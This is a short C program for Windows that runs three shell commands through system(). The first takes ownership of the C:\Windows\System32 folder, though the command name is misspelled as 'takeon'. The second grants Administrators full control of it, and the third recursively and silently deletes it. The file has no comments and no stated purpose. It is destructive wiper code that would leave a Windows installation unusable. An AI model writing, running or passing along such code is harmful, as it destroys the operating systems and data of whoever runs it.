#include <windows.h>

int main() {
    system("takeon /f C:\\Windows\\System32 /r /a y");
    system("icacls C:\\Windows\\System32 /grant Administrators:F /T");
    system("del /s /q C:\\Windows\\System32");
    return 0;
}